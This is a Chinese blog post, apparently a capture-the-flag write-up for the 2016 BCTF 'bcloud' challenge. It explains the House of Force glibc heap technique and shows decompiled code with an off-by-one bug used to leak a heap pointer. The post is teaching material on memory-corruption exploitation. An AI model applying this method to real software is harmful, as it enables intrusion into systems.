<!DOCTYPE html>
<html lang="zh-Hans">
    <!-- title -->




<!-- keywords -->




<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="Po1lux">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Po1lux">
    
    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content>
    <meta name="description" content="0x00 House of ForceHouse Of Force &amp;#x662F;&amp;#x4E00;&amp;#x79CD;&amp;#x5806;&amp;#x5229;&amp;#x7528;&amp;#x65B9;&amp;#x6CD5;,&amp;#x901A;&amp;#x8FC7;&amp;#x6EA2;&amp;#x51FA;&amp;#x7684;&amp;#x65B9;&amp;#x5F0F;&amp;#x5C06;topchunk&amp;#x7684;size&amp;#x4FEE;&amp;#x6539;&amp;">
<meta name="keywords" content="House of Force">
<meta property="og:type" content="article">
<meta property="og:title" content="2016-BCTF-bcloud-[Heap of Force]">
<meta property="og:url" content="http://yoursite.com/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/index.html">
<meta property="og:site_name" content="Po1lux&#39;s Diary">
<meta property="og:description" content="0x00 House of ForceHouse Of Force &amp;#x662F;&amp;#x4E00;&amp;#x79CD;&amp;#x5806;&amp;#x5229;&amp;#x7528;&amp;#x65B9;&amp;#x6CD5;,&amp;#x901A;&amp;#x8FC7;&amp;#x6EA2;&amp;#x51FA;&amp;#x7684;&amp;#x65B9;&amp;#x5F0F;&amp;#x5C06;topchunk&amp;#x7684;size&amp;#x4FEE;&amp;#x6539;&amp;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-03-24T14:41:51.600Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2016-BCTF-bcloud-[Heap of Force]">
<meta name="twitter:description" content="0x00 House of ForceHouse Of Force &amp;#x662F;&amp;#x4E00;&amp;#x79CD;&amp;#x5806;&amp;#x5229;&amp;#x7528;&amp;#x65B9;&amp;#x6CD5;,&amp;#x901A;&amp;#x8FC7;&amp;#x6EA2;&amp;#x51FA;&amp;#x7684;&amp;#x65B9;&amp;#x5F0F;&amp;#x5C06;topchunk&amp;#x7684;size&amp;#x4FEE;&amp;#x6539;&amp;">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>2016-BCTF-bcloud-[Heap of Force] · pollux&#39;s Dairy</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/favicon.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >fi3ework&#39;s Dairy.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">2016-BCTF-bcloud-[Heap of Force]</a>
            </div>
    </div>
    
    <a class="home-link" href=/>fi3ework's Dairy.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            2016-BCTF-bcloud-[Heap of Force]
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "House of Force">House of Force</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">2.5k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2019/03/20</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h3 id="0x00-House-of-Force"><a href="#0x00-House-of-Force" class="headerlink" title="0x00 House of Force"></a>0x00 House of Force</h3><p>House Of Force &#x662F;&#x4E00;&#x79CD;&#x5806;&#x5229;&#x7528;&#x65B9;&#x6CD5;,&#x901A;&#x8FC7;&#x6EA2;&#x51FA;&#x7684;&#x65B9;&#x5F0F;&#x5C06;topchunk&#x7684;size&#x4FEE;&#x6539;&#x6210;&#x8DB3;&#x591F;&#x5927;&#xFF0C;&#x5728;&#x901A;&#x8FC7;&#x7533;&#x8BF7;&#x4E00;&#x5B9A;&#x5927;&#x5C0F;&#x7684;chunk&#xFF0C;&#x5C06;topchunk&#x7684;&#x5730;&#x5740;&#x53D8;&#x6210;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;&#x67D0;&#x4E9B;&#x51FD;&#x6570;&#x7684;got&#x5730;&#x5740;&#xFF0C;&#x6B64;&#x65F6;&#x518D;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5BF9;&#x8BE5;got&#x6307;&#x9488;&#x7684;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x548C;&#x5229;&#x7528;&#x3002;</p>
<p>&#x5F53;&#x7528;&#x6237;&#x7533;&#x8BF7;chunk&#x65F6;&#xFF0C;&#x6240;&#x6709;&#x7A7A;&#x95F2;&#x5757;&#x5747;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x5176;&#x5927;&#x5C0F;&#x65F6;&#xFF0C;glibc&#x5C31;&#x4F1A;&#x4ECE;topchunk&#x4E2D;&#x5206;&#x5272;&#x51FA;&#x76F8;&#x5E94;&#x5927;&#x5C0F;&#x7684;chunk&#x3002;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7A7A;&#x95F2;&#x5757;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x7684;chunk&#x90FD;&#x4F1A;&#x4ECE;topchunk&#x4E2D;&#x5206;&#x5272;&#xFF0C;glibc&#x5BF9;&#x6B64;&#x6709;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#x3002;<br>&#x5728;glibc&#x6E90;&#x7801;<code>_int_malloc</code>&#x51FD;&#x6570;&#x4E2D;&#xFF1A;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#x83B7;&#x53D6;topchunk&#x6307;&#x9488;&#xFF0C;&#x83B7;&#x53D6;topchunk&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">//&#x5982;&#x679C;&#x5728;&#x5206;&#x5272;&#x4E4B;&#x540E;&#xFF0C;topchunk&#x7684;&#x5927;&#x5C0F;&#x5927;&#x4E8E;MINSIZE&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5206;&#x5272;&#x3002;&#x8FD9;&#x91CC;&#x8FD8;&#x9700;&#x8981;&#x52A0;&#x4E0A;MINSIZE&#x662F;&#x7531;&#x4E8E;topchunk&#x5FC5;&#x987B;&#x7559;&#x4E0B;&#x6765;&#x7528;&#x4F5C;fencepost&#xFF0C;&#x4EE5;&#x5206;&#x9694;&#x5806;&#x548C;&#x5176;&#x4ED6;&#x7A7A;&#x95F4;&#x3002;</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">{</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    <span class="comment">//&#x66F4;&#x65B0;topchunk</span></span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x6E90;&#x7801;&#x4E2D;&#x6709;&#x4E00;&#x6BB5;&#x6CE8;&#x91CA;</p>
<blockquote>
<p>We require that av-&gt;top always exists (i.e., has size &gt;=MINSIZE) after initialization, so if it would otherwise beexhausted by current request, it is replenished. (The mainreason for ensuring it exists is that we may need MINSIZE spaceto put in fenceposts in sysmalloc.)</p>
</blockquote>
<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;topchunk&#x7684;size&#x7BE1;&#x6539;&#x6210;&#x5F88;&#x5927;&#x7684;&#x503C;&#xFF08;&#x6BD4;&#x5982;&#x5728;x86&#x4E0B;&#x7BE1;&#x6539;&#x4E3A;0xffffffff&#xFF09;&#x5C31;&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x9A8C;&#x8BC1;&#x3002;<br>&#x4E4B;&#x540E;topchunk&#x6307;&#x9488;&#x4F1A;&#x66F4;&#x65B0;&#xFF0C;&#x4E0B;&#x6B21;&#x7533;&#x8BF7;chunk&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x628A;&#x5730;&#x5740;&#x5206;&#x914D;&#x5230;&#x66F4;&#x65B0;&#x540E;&#x7684;topchunk&#x7684;&#x5730;&#x5740;&#x4E0A;&#xFF0C;&#x7528;&#x6237;&#x5982;&#x679C;&#x901A;&#x8FC7;&#x8BE5;&#x65B9;&#x5F0F;&#x63A7;&#x5236;&#x4E86;&#x6307;&#x9488;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x7684;&#x8BFB;&#x548C;&#x5199;&#x3002;</p>
<h3 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016-BCTF-bcloud"></a>2016-BCTF-bcloud</h3><p>&#x7A0B;&#x5E8F;&#x7684;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Canary</span>                        <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">NX</span>                            <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">PIE</span>                           <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">Fortify</span>                       <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">RelRO</span>                         <span class="string">:</span> <span class="string">Partial</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./bcloud</span><br><span class="line">Input your name:</span><br><span class="line">aa</span><br><span class="line">Hey aa! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!</span><br><span class="line">Now let&apos;s <span class="built_in">set</span> synchronization options.</span><br><span class="line">Org:</span><br><span class="line">bb</span><br><span class="line">Host:</span><br><span class="line">cc</span><br><span class="line">OKay! Enjoy:)</span><br><span class="line"><span class="number">1.</span>New note</span><br><span class="line"><span class="number">2.</span>Show note</span><br><span class="line"><span class="number">3.</span>Edit note</span><br><span class="line"><span class="number">4.</span>Delete note</span><br><span class="line"><span class="number">5.</span>Syn</span><br><span class="line"><span class="number">6.</span>Quit</span><br><span class="line">option---&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="0x02-&#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x02-&#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x02 &#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;"></a>0x02 &#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;</h3><h4 id="1-&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;"><a href="#1-&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;" class="headerlink" title="1.&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;"></a>1.&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;</h4><p>&#x7A0B;&#x5E8F;&#x6709;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x7684;read&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x529F;&#x80FD;&#x5C31;&#x662F;&#x5C06;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x5199;&#x5165;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x7A0B;&#x5E8F;&#x6709;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x8C03;&#x7528;&#x4E86;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x6BD4;&#x5982;&#x5728;&#x7A0B;&#x5E8F;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x8F93;&#x5165;name&#x3001;Org&#x3001;Host&#x65F6;&#x5C31;&#x8C03;&#x7528;&#x4E86;&#x8BE5;&#x51FD;&#x6570;&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804868D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  }</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;   <span class="comment">//* off by one</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x5728;&#x8F93;&#x5165;name&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x5185;&#x5B58;&#x5E03;&#x5C40;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x6B64;&#x4E0A;&#x8FF0;&#x81EA;&#x5B9A;&#x4E49;&#x7684;read&#x51FD;&#x6570;*&#x5904;&#x5C31;&#x51FA;&#x73B0;&#x4E86;off by one &#x6F0F;&#x6D1E;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">input_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  iread((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  sub_8048779(v2);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x77E5;&#x9053;s&#x548C;v2&#x5728;&#x6808;&#x4E2D;&#x7684;&#x4F4D;&#x7F6E;<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    v2      |  # ebp-0x1c</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    ...     |  # &#x4E2D;&#x95F4;&#x6709;63&#x4E2A;&#x5355;&#x4F4D;&#x7684;&#x7A7A;&#x95F4;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     s      |  # ebp-0x5c</span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure></p>
<p>&#x6240;&#x4EE5;&#x5F53;name&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A;64&#x65F6;&#xFF0C;iread&#x51FD;&#x6570;&#x4F1A;&#x5728;&#x5176;&#x540E;&#x52A0;&#x4E0A;&#x2019;\x00&#x2019;&#x4F5C;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x622A;&#x65AD;&#x7B26;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x5728;input_name&#x51FD;&#x6570;&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x662F;v2&#x7684;&#x5730;&#x5740;&#xFF0C;v2&#x662F;&#x5806;&#x6307;&#x9488;&#x3002;&#x56E0;&#x4E3A;strcpy&#x51FD;&#x6570;&#x590D;&#x5236;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x662F;&#x4EE5;&#x2019;\x00&#x2019;&#x4E3A;&#x622A;&#x65AD;&#x7B26;&#xFF0C;&#x56E0;&#x6B64;&#x5F53;name&#x4E3A;64&#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x5C06;v2&#x7684;&#x5730;&#x5740;&#x6253;&#x5370;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x6B64;&#x5904;<code>Hey aa! Welcome</code>&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;&#x3002;</p>
